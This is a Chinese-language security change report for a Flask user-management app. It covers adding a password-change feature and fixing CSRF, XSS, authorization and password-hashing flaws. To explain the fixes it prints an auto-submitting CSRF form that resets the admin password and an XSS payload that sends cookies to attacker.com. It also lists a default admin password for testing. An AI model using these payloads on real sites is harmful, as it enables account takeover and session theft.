# 修改报告（2026-07-24）

## 项目信息

- 项目名称：用户管理系统（Flask）
- 仓库地址：https://github.com/j04783993-prog/qs
- 修改日期：2026-07-24
- 修改人员：Jerry

---

## 一、新增功能：密码修改

### 1. 在 `app.py` 中新增路由 `/change-password`（POST）

- 从表单接收 `username`、`old_password` 和 `new_password` 参数
- 验证原密码后更新数据库中的密码字段
- 使用 `werkzeug.security` 的哈希函数存储密码
- 修改成功后重定向到 `/profile`

### 2. 修改 `templates/profile.html`

- 在个人中心页面添加"修改密码"表单
- 包含：原密码输入框、新密码输入框、确认密码输入框、修改按钮
- 使用隐藏字段传递 `username` 和 CSRF Token

---

## 二、安全审查与漏洞修复

### 审查发现的漏洞

| 漏洞 | 风险等级 | 类型 |
|------|---------|------|
| CSRF 攻击 | 高 | 跨站请求伪造 |
| XSS 攻击 | 中 | 跨站脚本 |

---

### 修复 1：CSRF 攻击

**问题：** `/change-password` 路由未验证 CSRF Token，攻击者可构造恶意页面诱导用户点击，自动修改他人密码：

```html
<!-- 攻击者构造恶意页面 -->
<form action="http://victim.com/change-password" method="POST">
  <input name="username" value="admin">
  <input name="new_password" value="hacked">
</form>
<script>document.forms[0].submit();</script>
```

当已登录用户访问此页面时，会自动提交表单修改密码。

**修复：** 在 `/change-password` 路由中添加 CSRF Token 验证：

```python
# CSRF 校验
if not _validate_csrf_token():
    flash("CSRF 令牌无效，请重新操作", "error")
    return redirect(url_for("profile", user_id=session.get("user_id")))
```

同时在 `profile.html` 模板中添加 CSRF Token 隐藏字段：

```html
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

---

### 修复 2：XSS 攻击

**问题：** `/page` 路由加载的 HTML 内容使用 `| safe` 渲染，绕过 Jinja2 自动转义。如果攻击者能在 `pages/` 目录中写入文件（如通过文件上传漏洞），可注入恶意 JavaScript：

```html
<!-- 恶意页面内容 -->
<div>
  <h2>帮助中心</h2>
  <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
</div>
```

**修复：** 使用 `bleach` 库清理 HTML 内容，只允许安全的标签和属性：

```python
import bleach

# 安全处理：使用 bleach 清理 HTML，防止 XSS
allowed_tags = ['div', 'h2', 'h3', 'ul', 'li', 'p', 'span', 'a', 'br', 'strong', 'em']
allowed_attrs = {'a': ['href', 'title'], 'div': ['class'], 'span': ['class'], ...}
safe_content = bleach.clean(content, tags=allowed_tags, attributes=allowed_attrs)
```

修复后，任何尝试注入 `<script>`、`<iframe>`、`onload` 等恶意代码都会被自动移除。

---

## 三、其他修复（非 XSS/CSRF 相关）

本次还修复了以下漏洞：

1. **越权操作**：`/change-password` 添加权限校验，只能修改自己的密码
2. **原密码验证**：修改密码前必须验证原密码
3. **密码明文存储**：注册和密码修改均使用 `generate_password_hash` 哈希存储
4. **登录与数据库不同步**：登录验证改为从数据库查询
5. **登录限速绕过**：速率限制改为基于 IP，不使用 X-Forwarded-For

---

## 四、文件变更清单

| 文件 | 变更类型 | 说明 |
|------|---------|------|
| `app.py` | 修改 | 新增 `/change-password` 路由，添加 CSRF/权限/密码验证，修复 XSS，修复登录和限速 |
| `templates/profile.html` | 修改 | 添加原密码输入框和 CSRF Token |
| `day7密码修改漏洞.md` | 新增 | 本报告 |

---

## 五、验证方式

### 启动应用

```bash
cd /opt/Class01
python3 app.py
```

### 测试正常流程

1. 访问 `http://127.0.0.1:5000`
2. 登录（admin / `ChangeMe!Admin2025#`）
3. 进入个人中心，填写原密码和新密码
4. 点击"修改密码"，确认修改成功

### 测试 CSRF 防护

1. 登录后打开浏览器开发者工具
2. 删除表单中的 `csrf_token` 字段
3. 提交表单，应提示"CSRF 令牌无效"

### 测试 XSS 防护

1. 创建恶意页面文件 `pages/test.html`：

```html
<div><script>alert('XSS')</script></div>
```

2. 访问 `/page?name=test`
3. 确认 `<script>` 标签被移除，不会执行 JavaScript

---

## 六、后续建议

1. **密码强度校验**：添加密码长度、复杂度要求
2. **密码修改日志**：记录密码修改操作，便于安全审计
3. **会话失效**：修改密码后使其他已登录的会话失效
4. **验证码**：敏感操作（如密码修改）添加验证码
